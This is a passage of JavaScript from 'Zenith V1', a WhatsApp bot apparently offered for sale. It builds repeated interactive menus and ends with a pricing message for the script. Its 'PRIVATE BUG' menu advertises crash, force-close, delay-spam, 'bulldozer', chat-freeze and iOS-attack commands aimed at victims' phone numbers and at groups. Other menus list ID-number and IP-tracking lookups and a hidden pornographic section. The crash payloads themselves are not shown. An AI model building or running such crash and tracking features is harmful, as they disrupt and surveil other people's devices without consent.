buttonParamsJson: JSON.stringify({
display_text: "さ IS ZENITH",
id: ".bugmenu"
})
},

{
name: "cta_call",
buttonParamsJson: JSON.stringify({
display_text: "Call Developer",
id: "628895916513"
})
},

{
name: "cta_url",
buttonParamsJson: JSON.stringify({
display_text: "Telegram Dev",
url: "https://t.me/Kentyzzz1",
merchant_url: "https://t.me/Kentyzzz1"
})
},

{
name: "cta_copy",
buttonParamsJson: JSON.stringify({
display_text: "Copy Version",
copy_code: "ZENITH-V1"
})
},

{
name: "single_select",
buttonParamsJson: JSON.stringify({

title: "© Zenith V1",

sections: [
{
title: "List Menu",
highlight_label: "Top Feature 🚀",

rows: [

{
title: "𝐀𝐋𝐋 𝐌𝐄𝐍𝐔",
description: "Displays all bot commands",
id: ".allmenu"
},

{
title: "𝐁𝐔𝐆 𝐌𝐄𝐍𝐔",
description: "Displays bug features",
id: ".bugmenu"
},

{
title: "𝐎𝐖𝐍𝐄𝐑 𝐌𝐄𝐍𝐔",
description: "Displays owner features",
id: ".ownermenu"
},

{
title: "𝐅𝐔𝐍 𝐌𝐄𝐍𝐔",
description: "Displays fun features",
id: ".funmenu"
},

{
title: "𝐂𝐏𝐀𝐍𝐄𝐋 𝐌𝐄𝐍𝐔",
description: "Displays panel features",
id: ".cpanelmenu"
},

{
title: "𝐓𝐇𝐀𝐍𝐊𝐒 𝐓𝐎",
description: "Support list",
id: ".tqto"
},

{
title: "𝐒𝐂𝐑𝐈𝐏𝐓",
description: "Displays script info",
id: ".script"
},

{
title: "𝐃𝐄𝐕𝐄𝐋𝐎𝐏𝐄𝐑",
description: "Developer contact",
id: ".owner"
}

]
}
]

})
}

]

})

})

}
}
},
{ quoted: lol }
)

await depayy.relayMessage(
m.chat,
msg.message,
{
messageId: msg.key.id
}
)

await depayy.sendMessage(
m.chat,
{
audio: sawit,
mimetype: "audio/mp4",
ptt: false
},
{
quoted: qkontak
}
)

}
break    
    case "funmenu": {
    const nowJakarta = moment().tz('Asia/Jakarta');
    await depayy.sendMessage(m.chat, { react: { text: "☠️", key: m.key } });

    let teks = `\`𝐙𝐄𝐍𝐈𝐓𝐇 𝐕𝟏\`
    
Hi \`${pushname}\` 👋 ${getGreeting(parseInt(nowJakarta.format('HH')))} I'm Zenith, your WhatsApp assistant. I'm here to help you with various tasks and make things easier for you. Just send what you need and I'll do my best to assist you. ✨
       
⌲ \`𝐈𝐍𝐅𝐎𝐑𝐌𝐀𝐓𝐈𝐎𝐍 𝐁𝐎𝐓\`
┏━━━━━━━━━━━━━━━━
┃✦ *Name Bot  » Zenith*
┃✦ *Owner » Depayy*
┃✦ *Developer » Ken*
┃✦ *Version  »  V1*
┃✦ *Language » JavaScript*
┃✦ *RunTime   » ${runtime(process.uptime())}*
┃✦ *Bot Mode » ${depayy.public ? "Public" : "Self"}*
┃✦ TypeScript : *JavaScript*
┃✦ *StatusScript  » buyVip/buyer*
┗━━━━━━━━━━━━━━━━━━

\`[洛] 𝐅𝐔𝐍 𝐌𝐄𝐍𝐔 [洛]\`
→ .Zenith ( Ai )
→ .promote
→ .demote
→ .open
→ .close
→ .kick
→ .hidetag
→ .tagall
→ .rvo
→ .addcase
→ .getcase
→ .delcase
→ .nik-information
→ .tiktokslide
→ .school-track
→ .cuaca
→ .copyme
→ .copy
→ .cweb
→ .listweb
→ .delweb
→ .getsw
→ .cekkhodam
→ .cekganteng
→ .cekcantik
→ .cekkontol
→ .cekidgc
→ .cekidch
→ .stiker
→ .tiktok
→ .bocilwindah
→ .brat
→ .getcode
→ .tourl
→ .trackip
→ .quotesgalau
→ .quotesmotivasi
→ .quotesbacot
→ .quotesbucin
→ .kisahnabi
→ .qc
→ .swgrup`

const msg = generateWAMessageFromContent(
m.chat,
{
viewOnceMessage: {
message: {

interactiveMessage: proto.Message.InteractiveMessage.create({

body: proto.Message.InteractiveMessage.Body.create({
text: teks
}),

footer: proto.Message.InteractiveMessage.Footer.create({
text: "© Zenith V1"
}),

header: proto.Message.InteractiveMessage.Header.create({
hasMediaAttachment: true,

imageMessage: (
await prepareWAMessageMedia(
{
image: {
url: "https://files.catbox.moe/2e3824.jpg"
}
},
{
upload: depayy.waUploadToServer
}
)
).imageMessage
}),

contextInfo: {
isForwarded: true,
forwardingScore: 999999,

forwardedNewsletterMessageInfo: {
newsletterJid: "120363405690100911@newsletter",
newsletterName: "Ken Nasgor Goreng",
serverMessageId: 145
}
},

nativeFlowMessage:
proto.Message.InteractiveMessage.NativeFlowMessage.create({

messageParamsJson: JSON.stringify({

limited_time_offer: {
text: "𝐙𝐄𝐍𝐈𝐓𝐇 𝐕𝟏",
url: "https://t.me/Kentyzzz1",
copy_code: "ZENITH-V1",
expiration_time: Date.now() * 999
},

bottom_sheet: {
in_thread_buttons_limit: 2,
divider_indices: [1,2,3,4],
list_title: "CLICK HERE",
button_title: "ZENITH"
}

}),

buttons: [

{
name: "quick_reply",
buttonParamsJson: JSON.stringify({
display_text: "さ KENSHII",
id: ".allmenu"
})
},

{
name: "quick_reply",
buttonParamsJson: JSON.stringify({
display_text: "さ IS ZENITH",
id: ".bugmenu"
})
},

{
name: "cta_call",
buttonParamsJson: JSON.stringify({
display_text: "Call Developer",
id: "628895916513"
})
},

{
name: "cta_url",
buttonParamsJson: JSON.stringify({
display_text: "Telegram Dev",
url: "https://t.me/Kentyzzz1",
merchant_url: "https://t.me/Kentyzzz1"
})
},

{
name: "cta_copy",
buttonParamsJson: JSON.stringify({
display_text: "Copy Version",
copy_code: "ZENITH-V1"
})
},

{
name: "single_select",
buttonParamsJson: JSON.stringify({

title: "© Zenith V1",

sections: [
{
title: "List Menu",
highlight_label: "Top Feature 🚀",

rows: [

{
title: "𝐀𝐋𝐋 𝐌𝐄𝐍𝐔",
description: "Displays all bot commands",
id: ".allmenu"
},

{
title: "𝐁𝐔𝐆 𝐌𝐄𝐍𝐔",
description: "Displays bug features",
id: ".bugmenu"
},

{
title: "𝐎𝐖𝐍𝐄𝐑 𝐌𝐄𝐍𝐔",
description: "Displays owner features",
id: ".ownermenu"
},

{
title: "𝐅𝐔𝐍 𝐌𝐄𝐍𝐔",
description: "Displays fun features",
id: ".funmenu"
},

{
title: "𝐂𝐏𝐀𝐍𝐄𝐋 𝐌𝐄𝐍𝐔",
description: "Displays panel features",
id: ".cpanelmenu"
},

{
title: "𝐓𝐇𝐀𝐍𝐊𝐒 𝐓𝐎",
description: "Support list",
id: ".tqto"
},

{
title: "𝐒𝐂𝐑𝐈𝐏𝐓",
description: "Displays script info",
id: ".script"
},

{
title: "𝐃𝐄𝐕𝐄𝐋𝐎𝐏𝐄𝐑",
description: "Developer contact",
id: ".owner"
}

]
}
]

})
}

]

})

})

}
}
},
{ quoted: lol }
)

await depayy.relayMessage(
m.chat,
msg.message,
{
messageId: msg.key.id
}
)

await depayy.sendMessage(
m.chat,
{
audio: sawit,
mimetype: "audio/mp4",
ptt: false
},
{
quoted: qkontak
}
)

}
break
case "cpanelmenu": {
    const nowJakarta = moment().tz('Asia/Jakarta');
    await depayy.sendMessage(m.chat, { react: { text: "☠️", key: m.key } });

    let teks = `\`𝐙𝐄𝐍𝐈𝐓𝐇 𝐕𝟏\`
    
Hi \`${pushname}\` 👋 ${getGreeting(parseInt(nowJakarta.format('HH')))} I'm Zenith, your WhatsApp assistant. I'm here to help you with various tasks and make things easier for you. Just send what you need and I'll do my best to assist you. ✨
       
⌲ \`𝐈𝐍𝐅𝐎𝐑𝐌𝐀𝐓𝐈𝐎𝐍 𝐁𝐎𝐓\`
┏━━━━━━━━━━━━━━━━
┃✦ *Name Bot  » Zenith*
┃✦ *Owner » Depayy*
┃✦ *Developer » Ken*
┃✦ *Version  »  V1*
┃✦ *Language » JavaScript*
┃✦ *RunTime   » ${runtime(process.uptime())}*
┃✦ *Bot Mode » ${depayy.public ? "Public" : "Self"}*
┃✦ TypeScript : *JavaScript*
┃✦ *StatusScript  » buyVip/buyer*
┗━━━━━━━━━━━━━━━━━━

\`[洛] 𝐂𝐏𝐀𝐍𝐄𝐋 𝐌𝐄𝐍𝐔 [洛]\`
→ .1gb *username*
→ .2gb *username*
→ .3gb *username*
→ .4gb *username*
→ .5gb *username*
→ .6gb *username*
→ .7gb *username*
→ .8gb *username*
→ .9gb *username*
→ .10gb *username*
→ .unli *username*
→ .cadmin *username*
→ .delpanel
→ .deladmin
→ .listpanel
→ .listadmin
→ .addres
→ .delres`

const msg = generateWAMessageFromContent(
m.chat,
{
viewOnceMessage: {
message: {

interactiveMessage: proto.Message.InteractiveMessage.create({

body: proto.Message.InteractiveMessage.Body.create({
text: teks
}),

footer: proto.Message.InteractiveMessage.Footer.create({
text: "© Zenith V1"
}),

header: proto.Message.InteractiveMessage.Header.create({
hasMediaAttachment: true,

imageMessage: (
await prepareWAMessageMedia(
{
image: {
url: "https://files.catbox.moe/2e3824.jpg"
}
},
{
upload: depayy.waUploadToServer
}
)
).imageMessage
}),

contextInfo: {
isForwarded: true,
forwardingScore: 999999,

forwardedNewsletterMessageInfo: {
newsletterJid: "120363405690100911@newsletter",
newsletterName: "Ken Nasgor Goreng",
serverMessageId: 145
}
},

nativeFlowMessage:
proto.Message.InteractiveMessage.NativeFlowMessage.create({

messageParamsJson: JSON.stringify({

limited_time_offer: {
text: "𝐙𝐄𝐍𝐈𝐓𝐇 𝐕𝟏",
url: "https://t.me/Kentyzzz1",
copy_code: "ZENITH-V1",
expiration_time: Date.now() * 999
},

bottom_sheet: {
in_thread_buttons_limit: 2,
divider_indices: [1,2,3,4],
list_title: "CLICK HERE",
button_title: "ZENITH"
}

}),

buttons: [

{
name: "quick_reply",
buttonParamsJson: JSON.stringify({
display_text: "さ KENSHII",
id: ".allmenu"
})
},

{
name: "quick_reply",
buttonParamsJson: JSON.stringify({
display_text: "さ IS ZENITH",
id: ".bugmenu"
})
},

{
name: "cta_call",
buttonParamsJson: JSON.stringify({
display_text: "Call Developer",
id: "628895916513"
})
},

{
name: "cta_url",
buttonParamsJson: JSON.stringify({
display_text: "Telegram Dev",
url: "https://t.me/Kentyzzz1",
merchant_url: "https://t.me/Kentyzzz1"
})
},

{
name: "cta_copy",
buttonParamsJson: JSON.stringify({
display_text: "Copy Version",
copy_code: "ZENITH-V1"
})
},

{
name: "single_select",
buttonParamsJson: JSON.stringify({

title: "© Zenith V1",

sections: [
{
title: "List Menu",
highlight_label: "Top Feature 🚀",

rows: [

{
title: "𝐀𝐋𝐋 𝐌𝐄𝐍𝐔",
description: "Displays all bot commands",
id: ".allmenu"
},

{
title: "𝐁𝐔𝐆 𝐌𝐄𝐍𝐔",
description: "Displays bug features",
id: ".bugmenu"
},

{
title: "𝐎𝐖𝐍𝐄𝐑 𝐌𝐄𝐍𝐔",
description: "Displays owner features",
id: ".ownermenu"
},

{
title: "𝐅𝐔𝐍 𝐌𝐄𝐍𝐔",
description: "Displays fun features",
id: ".funmenu"
},

{
title: "𝐂𝐏𝐀𝐍𝐄𝐋 𝐌𝐄𝐍𝐔",
description: "Displays panel features",
id: ".cpanelmenu"
},

{
title: "𝐓𝐇𝐀𝐍𝐊𝐒 𝐓𝐎",
description: "Support list",
id: ".tqto"
},

{
title: "𝐒𝐂𝐑𝐈𝐏𝐓",
description: "Displays script info",
id: ".script"
},

{
title: "𝐃𝐄𝐕𝐄𝐋𝐎𝐏𝐄𝐑",
description: "Developer contact",
id: ".owner"
}

]
}
]

})
}

]

})

})

}
}
},
{ quoted: lol }
)

await depayy.relayMessage(
m.chat,
msg.message,
{
messageId: msg.key.id
}
)

await depayy.sendMessage(
m.chat,
{
audio: sawit,
mimetype: "audio/mp4",
ptt: false
},
{
quoted: qkontak
}
)

}
break
    case "wkkwkwmwvvsna": {
    const nowJakarta = moment().tz('Asia/Jakarta');
    await depayy.sendMessage(m.chat, { react: { text: "☠️", key: m.key } });

    let teks = `\`𝐙𝐄𝐍𝐈𝐓𝐇 𝐕𝟏\`
    
Hi \`${pushname}\` 👋 ${getGreeting(parseInt(nowJakarta.format('HH')))} I'm Zenith, your WhatsApp assistant. I'm here to help you with various tasks and make things easier for you. Just send what you need and I'll do my best to assist you. ✨
       
⌲ \`𝐈𝐍𝐅𝐎𝐑𝐌𝐀𝐓𝐈𝐎𝐍 𝐁𝐎𝐓\`
┏━━━━━━━━━━━━━━━━
┃✦ *Name Bot  » Zenith*
┃✦ *Owner » Depayy*
┃✦ *Developer » Ken*
┃✦ *Version  »  V1*
┃✦ *Language » JavaScript*
┃✦ *RunTime   » ${runtime(process.uptime())}*
┃✦ *Bot Mode » ${depayy.public ? "Public" : "Self"}*
┃✦ TypeScript : *JavaScript*
┃✦ *StatusScript  » buyVip/buyer*
┗━━━━━━━━━━━━━━━━━━

\`[洛] 𝐍𝐒𝐅𝐖 𝐌𝐄𝐍𝐔 [洛]\`
→ .18+
→ .asupan
→ .paptt
→ .nsfw
→ .hentaineko
→ .manga
→ .cum
→ .ero
→ .gangbang
→ .foot
→ .milf
→ .pussy
→ .yuri
→ .zettai
`

const msg = generateWAMessageFromContent(
m.chat,
{
viewOnceMessage: {
message: {

interactiveMessage: proto.Message.InteractiveMessage.create({

body: proto.Message.InteractiveMessage.Body.create({
text: teks
}),

footer: proto.Message.InteractiveMessage.Footer.create({
text: "© Zenith V1"
}),

header: proto.Message.InteractiveMessage.Header.create({
hasMediaAttachment: true,

imageMessage: (
await prepareWAMessageMedia(
{
image: {
url: "https://files.catbox.moe/2e3824.jpg"
}
},
{
upload: depayy.waUploadToServer
}
)
).imageMessage
}),

contextInfo: {
isForwarded: true,
forwardingScore: 999999,

forwardedNewsletterMessageInfo: {
newsletterJid: "120363405690100911@newsletter",
newsletterName: "Ken Nasgor Goreng",
serverMessageId: 145
}
},

nativeFlowMessage:
proto.Message.InteractiveMessage.NativeFlowMessage.create({

messageParamsJson: JSON.stringify({

limited_time_offer: {
text: "𝐙𝐄𝐍𝐈𝐓𝐇 𝐕𝟏",
url: "https://t.me/Kentyzzz1",
copy_code: "ZENITH-V1",
expiration_time: Date.now() * 999
},

bottom_sheet: {
in_thread_buttons_limit: 2,
divider_indices: [1,2,3,4],
list_title: "CLICK HERE",
button_title: "ZENITH"
}

}),

buttons: [

{
name: "quick_reply",
buttonParamsJson: JSON.stringify({
display_text: "さ KENSHII",
id: ".allmenu"
})
},

{
name: "quick_reply",
buttonParamsJson: JSON.stringify({
display_text: "さ IS ZENITH",
id: ".bugmenu"
})
},

{
name: "cta_call",
buttonParamsJson: JSON.stringify({
display_text: "Call Developer",
id: "628895916513"
})
},

{
name: "cta_url",
buttonParamsJson: JSON.stringify({
display_text: "Telegram Dev",
url: "https://t.me/Kentyzzz1",
merchant_url: "https://t.me/Kentyzzz1"
})
},

{
name: "cta_copy",
buttonParamsJson: JSON.stringify({
display_text: "Copy Version",
copy_code: "ZENITH-V1"
})
},

{
name: "single_select",
buttonParamsJson: JSON.stringify({

title: "© Zenith V1",

sections: [
{
title: "List Menu",
highlight_label: "Top Feature 🚀",

rows: [

{
title: "𝐀𝐋𝐋 𝐌𝐄𝐍𝐔",
description: "Displays all bot commands",
id: ".allmenu"
},

{
title: "𝐁𝐔𝐆 𝐌𝐄𝐍𝐔",
description: "Displays bug features",
id: ".bugmenu"
},

{
title: "𝐎𝐖𝐍𝐄𝐑 𝐌𝐄𝐍𝐔",
description: "Displays owner features",
id: ".ownermenu"
},

{
title: "𝐅𝐔𝐍 𝐌𝐄𝐍𝐔",
description: "Displays fun features",
id: ".funmenu"
},

{
title: "𝐂𝐏𝐀𝐍𝐄𝐋 𝐌𝐄𝐍𝐔",
description: "Displays panel features",
id: ".cpanelmenu"
},

{
title: "𝐓𝐇𝐀𝐍𝐊𝐒 𝐓𝐎",
description: "Support list",
id: ".tqto"
},

{
title: "𝐒𝐂𝐑𝐈𝐏𝐓",
description: "Displays script info",
id: ".script"
},

{
title: "𝐃𝐄𝐕𝐄𝐋𝐎𝐏𝐄𝐑",
description: "Developer contact",
id: ".owner"
}

]
}
]

})
}

]

})

})

}
}
},
{ quoted: lol }
)

await depayy.relayMessage(
m.chat,
msg.message,
{
messageId: msg.key.id
}
)

await depayy.sendMessage(
m.chat,
{
audio: sawit,
mimetype: "audio/mp4",
ptt: false
},
{
quoted: qkontak
}
)

}
break
    case "allmenu": {
    const nowJakarta = moment().tz('Asia/Jakarta');
    await depayy.sendMessage(m.chat, { react: { text: "☠️", key: m.key } });

    let teks = `\`𝐙𝐄𝐍𝐈𝐓𝐇 𝐕𝟏\`
    
Hi \`${pushname}\` 👋 ${getGreeting(parseInt(nowJakarta.format('HH')))} I'm Zenith, your WhatsApp assistant. I'm here to help you with various tasks and make things easier for you. Just send what you need and I'll do my best to assist you. ✨
       
⌲ \`𝐈𝐍𝐅𝐎𝐑𝐌𝐀𝐓𝐈𝐎𝐍 𝐁𝐎𝐓\`
┏━━━━━━━━━━━━━━━━
┃✦ *Name Bot  » Zenith*
┃✦ *Owner » Depayy*
┃✦ *Developer » Ken*
┃✦ *Version  »  V1*
┃✦ *Language » JavaScript*
┃✦ *RunTime   » ${runtime(process.uptime())}*
┃✦ *Bot Mode » ${depayy.public ? "Public" : "Self"}*
┃✦ TypeScript : *JavaScript*
┃✦ *StatusScript  » buyVip/buyer*
┗━━━━━━━━━━━━━━━━━━

\`[洛] 𝐏𝐑𝐈𝐕𝐀𝐓𝐄 𝐁𝐔𝐆 [洛]\`

   \`[ 𝐅𝐎𝐑𝐂𝐋𝐎𝐒𝐄 ]\`
→ .crash 628xxx
→ .ken-crashv2 628xxx
→ .ken-forclose 628xxx
→ .crash-onemsg 628xxx
→ .fc-invis 628xxx
→ .forclose 628xxx

    \`[ 𝐃𝐄𝐋𝐀𝐘 ]\`
→ .delay-god 628xxx
→ .delay-zenith 628xxx
→ .delay-hard 628xxx
→ .delay-maker 628xxx

  \`[ 𝐃𝐄𝐋𝐀𝐘 𝐁𝐄𝐁𝐀𝐒 𝐒𝐏𝐀𝐌 ]\`
→ .delay-spam 628xxx

   \`[ 𝐁𝐔𝐋𝐃𝐎𝐙𝐄𝐑 ]\`
→ .zenith-bulldozer 628xxx
→ .zenith-delay 628xxx
→ .zenith-bulldozerv2 628xxx

   \`[ 𝐔𝐈 ]\`
→ .frezee-chat 628xxx
→ .blank-zenith 628xxx
   
   \`[ 𝐈𝐎𝐒 ]\`
→ .zenith-ios 628xxx
→ .ios-attack 628xxx

\`[洛] 𝐁𝐔𝐆 𝐆𝐑𝐎𝐔𝐏 [洛]\`
→ .delay-gb *Link Group*
→ .blank-gb *Link Group*

\`[洛] 𝐎𝐖𝐍𝐄𝐑 𝐌𝐄𝐍𝐔 [洛]\`
→ .addowner
→ .delowner
→ .addmurbug
→ .delmurbug
→ .self
→ .public
→ .restart

\`[洛] 𝐅𝐔𝐍 𝐌𝐄𝐍𝐔 [洛]\`
→ .Zenith ( Ai )
→ .promote
→ .demote
→ .open
→ .close
→ .kick
→ .ht
→ .tagall
→ .rvo
→ .addcase
→ .getcase
→ .delcase
→ .nik-information
→ .tiktokslide
→ .school-track
→ .cuaca
→ .copyme
→ .copy
→ .cweb
→ .listweb
→ .delweb
→ .getsw
→ .cekkhodam
→ .cekganteng
→ .cekcantik
→ .cekkontol
→ .cekidgc
→ .cekidch
→ .stiker
→ .tiktok
→ .bocilwindah
→ .brat
→ .getcode
→ .tourl
→ .trackip
→ .quotesgalau
→ .quotesmotivasi
→ .quotesbacot
→ .quotesbucin
→ .kisahnabi
→ .qc
→ .swgrup

\`[洛] 𝐂𝐏𝐀𝐍𝐄𝐋 𝐌𝐄𝐍𝐔 [洛]\`
→ .1gb *username*
→ .2gb *username*
→ .3gb *username*
→ .4gb *username*
→ .5gb *username*
→ .6gb *username*
→ .7gb *username*
→ .8gb *username*
→ .9gb *username*
→ .10gb *username*
→ .unli *username*
→ .cadmin *username*
→ .delpanel
→ .deladmin
→ .listpanel
→ .listadmin
→ .addres
→ .delres

\`[洛] 𝐍𝐒𝐅𝐖 𝐌𝐄𝐍𝐔 [洛]\`
→ .18+
→ .asupan
→ .paptt
→ .nsfw
→ .hentaineko
→ .manga
→ .cum
→ .ero
→ .gangbang
→ .foot
→ .milf
→ .pussy
→ .yuri
→ .zettai
`
const msg = generateWAMessageFromContent(
m.chat,
{
viewOnceMessage: {
message: {

interactiveMessage: proto.Message.InteractiveMessage.create({

body: proto.Message.InteractiveMessage.Body.create({
text: teks
}),

footer: proto.Message.InteractiveMessage.Footer.create({
text: "© Zenith V1"
}),

header: proto.Message.InteractiveMessage.Header.create({
hasMediaAttachment: true,

imageMessage: (
await prepareWAMessageMedia(
{
image: {
url: "https://files.catbox.moe/2e3824.jpg"
}
},
{
upload: depayy.waUploadToServer
}
)
).imageMessage
}),

contextInfo: {
isForwarded: true,
forwardingScore: 999999,

forwardedNewsletterMessageInfo: {
newsletterJid: "120363405690100911@newsletter",
newsletterName: "Ken Nasgor Goreng",
serverMessageId: 145
}
},

nativeFlowMessage:
proto.Message.InteractiveMessage.NativeFlowMessage.create({

messageParamsJson: JSON.stringify({

limited_time_offer: {
text: "𝐙𝐄𝐍𝐈𝐓𝐇 𝐕𝟏",
url: "https://t.me/Kentyzzz1",
copy_code: "ZENITH-V1",
expiration_time: Date.now() * 999
},

bottom_sheet: {
in_thread_buttons_limit: 2,
divider_indices: [1,2,3,4],
list_title: "CLICK HERE",
button_title: "ZENITH"
}

}),

buttons: [

{
name: "quick_reply",
buttonParamsJson: JSON.stringify({
display_text: "さ KENSHII",
id: ".allmenu"
})
},

{
name: "quick_reply",
buttonParamsJson: JSON.stringify({
display_text: "さ IS ZENITH",
id: ".bugmenu"
})
},

{
name: "cta_call",
buttonParamsJson: JSON.stringify({
display_text: "Call Developer",
id: "628895916513"
})
},

{
name: "cta_url",
buttonParamsJson: JSON.stringify({
display_text: "Telegram Dev",
url: "https://t.me/Kentyzzz1",
merchant_url: "https://t.me/Kentyzzz1"
})
},

{
name: "cta_copy",
buttonParamsJson: JSON.stringify({
display_text: "Copy Version",
copy_code: "ZENITH-V1"
})
},

{
name: "single_select",
buttonParamsJson: JSON.stringify({

title: "© Zenith V1",

sections: [
{
title: "List Menu",
highlight_label: "Top Feature 🚀",

rows: [

{
title: "𝐀𝐋𝐋 𝐌𝐄𝐍𝐔",
description: "Displays all bot commands",
id: ".allmenu"
},

{
title: "𝐁𝐔𝐆 𝐌𝐄𝐍𝐔",
description: "Displays bug features",
id: ".bugmenu"
},

{
title: "𝐎𝐖𝐍𝐄𝐑 𝐌𝐄𝐍𝐔",
description: "Displays owner features",
id: ".ownermenu"
},

{
title: "𝐅𝐔𝐍 𝐌𝐄𝐍𝐔",
description: "Displays fun features",
id: ".funmenu"
},

{
title: "𝐂𝐏𝐀𝐍𝐄𝐋 𝐌𝐄𝐍𝐔",
description: "Displays panel features",
id: ".cpanelmenu"
},

{
title: "𝐓𝐇𝐀𝐍𝐊𝐒 𝐓𝐎",
description: "Support list",
id: ".tqto"
},

{
title: "𝐒𝐂𝐑𝐈𝐏𝐓",
description: "Displays script info",
id: ".script"
},

{
title: "𝐃𝐄𝐕𝐄𝐋𝐎𝐏𝐄𝐑",
description: "Developer contact",
id: ".owner"
}

]
}
]

})
}

]

})

})

}
}
},
{ quoted: lol }
)

await depayy.relayMessage(
m.chat,
msg.message,
{
messageId: msg.key.id
}
)

await depayy.sendMessage(
m.chat,
{
audio: sawit,
mimetype: "audio/mp4",
ptt: false
},
{
quoted: qkontak
}
)

}
break
case "tqto": {
await depayy.sendMessage(m.chat, { react: { text: "☠️", key: m.key } });
let teks = `〘 Thanks To Support 〙
Ken ϟ Developer
Ell  ϟ [ My Asis ]
Zinx ϟ [ My Asis ]
Manggala  ϟ [ My Tk ]
Yanz  ϟ [ My Tk ]
Dell  ϟ [ My Tk ]
PapaQueen  ϟ [ Freind ]
Kelpin ϟ [ Freind ]
Arr  ϟ [ Freind ]
`

const msg = generateWAMessageFromContent(
m.chat,
{
viewOnceMessage: {
message: {

interactiveMessage: proto.Message.InteractiveMessage.create({

body: proto.Message.InteractiveMessage.Body.create({
text: teks
}),

footer: proto.Message.InteractiveMessage.Footer.create({
text: "© Zenith V1"
}),

header: proto.Message.InteractiveMessage.Header.create({
hasMediaAttachment: true,

imageMessage: (
await prepareWAMessageMedia(
{
image: {
url: "https://files.catbox.moe/2e3824.jpg"
}
},
{
upload: depayy.waUploadToServer
}
)
).imageMessage
}),

contextInfo: {
isForwarded: true,
forwardingScore: 999999,

forwardedNewsletterMessageInfo: {
newsletterJid: "120363405690100911@newsletter",
newsletterName: "Ken Nasgor Goreng",
serverMessageId: 145
}
},

nativeFlowMessage:
proto.Message.InteractiveMessage.NativeFlowMessage.create({

messageParamsJson: JSON.stringify({

limited_time_offer: {
text: "𝐙𝐄𝐍𝐈𝐓𝐇 𝐕𝟏",
url: "https://t.me/Kentyzzz1",
copy_code: "ZENITH-V1",
expiration_time: Date.now() * 999
},

bottom_sheet: {
in_thread_buttons_limit: 2,
divider_indices: [1,2,3,4],
list_title: "CLICK HERE",
button_title: "ZENITH"
}

}),

buttons: [

{
name: "quick_reply",
buttonParamsJson: JSON.stringify({
display_text: "さ KENSHII",
id: ".allmenu"
})
},

{
name: "quick_reply",
buttonParamsJson: JSON.stringify({
display_text: "さ IS ZENITH",
id: ".bugmenu"
})
},

{
name: "cta_call",
buttonParamsJson: JSON.stringify({
display_text: "Call Developer",
id: "628895916513"
})
},

{
name: "cta_url",
buttonParamsJson: JSON.stringify({
display_text: "Telegram Dev",
url: "https://t.me/Kentyzzz1",
merchant_url: "https://t.me/Kentyzzz1"
})
},

{
name: "cta_copy",
buttonParamsJson: JSON.stringify({
display_text: "Copy Version",
copy_code: "ZENITH-V1"
})
},

{
name: "single_select",
buttonParamsJson: JSON.stringify({

title: "© Zenith V1",

sections: [
{
title: "List Menu",
highlight_label: "Top Feature 🚀",

rows: [

{
title: "𝐀𝐋𝐋 𝐌𝐄𝐍𝐔",
description: "Displays all bot commands",
id: ".allmenu"
},

{
title: "𝐁𝐔𝐆 𝐌𝐄𝐍𝐔",
description: "Displays bug features",
id: ".bugmenu"
},

{
title: "𝐎𝐖𝐍𝐄𝐑 𝐌𝐄𝐍𝐔",
description: "Displays owner features",
id: ".ownermenu"
},

{
title: "𝐅𝐔𝐍 𝐌𝐄𝐍𝐔",
description: "Displays fun features",
id: ".funmenu"
},

{
title: "𝐂𝐏𝐀𝐍𝐄𝐋 𝐌𝐄𝐍𝐔",
description: "Displays panel features",
id: ".cpanelmenu"
},

{
title: "𝐓𝐇𝐀𝐍𝐊𝐒 𝐓𝐎",
description: "Support list",
id: ".tqto"
},

{
title: "𝐒𝐂𝐑𝐈𝐏𝐓",
description: "Displays script info",
id: ".script"
},

{
title: "𝐃𝐄𝐕𝐄𝐋𝐎𝐏𝐄𝐑",
description: "Developer contact",
id: ".owner"
}

]
}
]

})
}

]

})

})

}
}
},
{ quoted: lol }
)

await depayy.relayMessage(
m.chat,
msg.message,
{
messageId: msg.key.id
}
)

await depayy.sendMessage(
m.chat,
{
audio: sawit,
mimetype: "audio/mp4",
ptt: false
},
{
quoted: qkontak
}
)

}
break
case "owner": {
await depayy.sendMessage(m.chat, { react: { text: "☠️",key: m.key,}}); 
let imgsc = await prepareWAMessageMedia({ image: fs.readFileSync("./image/depay.jpg") }, { upload: depayy.waUploadToServer })
const msgii = await generateWAMessageFromContent(m.chat, {
ephemeralMessage: {
message: {
messageContextInfo: {
deviceListMetadata: {},
deviceListMetadataVersion: 2
}, interactiveMessage: proto.Message.InteractiveMessage.fromObject({
body: proto.Message.InteractiveMessage.Body.fromObject({
text: ``,
}), 
contextInfo: {}, 
carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
cards: [{
header: proto.Message.InteractiveMessage.Header.fromObject({
title: `\`[ 𝗖𝗼𝗻𝘁𝗮𝗰𝘁 𝗢𝘄𝗻𝗲𝗿 ]\`
Contact Ken : 628895916513
Telegram :t.me/Kentyzzz1
TikTok : tiktok.com/@kenz_1111_`, 
hasMediaAttachment: true,
...imgsc
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
buttons: [{
name: "cta_url",
buttonParamsJson: `{\"display_text\":\"Whatsapp Ken\",\"url\":\"https://wa.me/628895916513\",\"merchant_url\":\"https://www.google.com\"}`
},
{
name: "cta_url",
buttonParamsJson: `{\"display_text\":\"Telegram\",\"url\":\"https://t.me/Kentyzzz1\",\"merchant_url\":\"https://www.google.com\"}`
},
{
name: "cta_url",
buttonParamsJson: `{\"display_text\":\"Saluran Info\",\"url\":\"https://whatsapp.com/channel/0029Vb7OMTIGJP8F10PSzM1q\",\"merchant_url\":\"https://www.google.com\"}`
}, 
{
name: "cta_url",
buttonParamsJson: `{\"display_text\":\"TikTok\",\"url\":\"\",\"merchant_url\":\"https://www.google.com\"}`
}, 
{
name: "cta_url",
buttonParamsJson: `{\"display_text\":\"Testimoni\",\"url\":\"https://whatsapp.com/channel/0029Vb7OMTIGJP8F10PSzM1q\",\"merchant_url\":\"https://www.google.com\"}`
}]
})
}]
})
})}
}}, {quoted: qkontak})
await depayy.relayMessage(m.chat, msgii.message, {messageId: msgii.key.id})
}

break

case 'script':
case 'sc': {
await depayy.sendMessage(m.chat, { react: { text: "☠️",key: m.key,}}); 
let teks = ` Hai Kak ${pushname} Tertarik Dengan Script Zenith? 
Harga Script Zenith  V1: 35K
Harga Reseller Zenith : 60K
Dll bisa langsung tanya tanya aja

Contact Real : wa.me/628895916513
Telegram : https://t.me/Kentyzzz1
TikTok : tiktok.com/@kenz_1111_
`
 let msgii = generateWAMessageFromContent(m.chat, { viewOnceMessage: { message: { 
"messageContextInfo": { 
"deviceListMetadata": {}, 
"deviceListMetadataVersion": 2
}, 
